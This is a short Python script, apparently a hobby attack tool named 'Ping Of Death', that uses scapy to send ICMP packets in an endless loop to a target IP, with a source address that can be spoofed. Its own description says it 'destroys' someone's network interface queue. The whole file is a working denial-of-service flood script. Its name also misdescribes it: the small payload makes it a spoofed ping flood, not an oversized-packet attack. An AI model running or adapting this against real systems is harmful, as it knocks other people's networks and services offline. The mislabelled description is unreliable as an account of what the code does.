from scapy.all import *
import argparse
import pyfiglet

banner = pyfiglet.figlet_format("Ping Of Death")
print(banner)

parser = argparse.ArgumentParser(prog="Ping of Death",description="Destroys someones network interface queue")
parser.add_argument("src",help="Source IP in the network")
parser.add_argument("dest",help="Destination IP address for the ping flood")
parser.add_argument("--message",help="Message to be transmitted with the ping request")
args = parser.parse_args()

# Change according with your IP addresses
SOURCE_IP=args.src
TARGET_IP=args.dest
MESSAGE=args.message or "T"
NUMBER_PACKETS=5 # Number of pings

pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*100)
send(NUMBER_PACKETS*pingOFDeath,loop=1)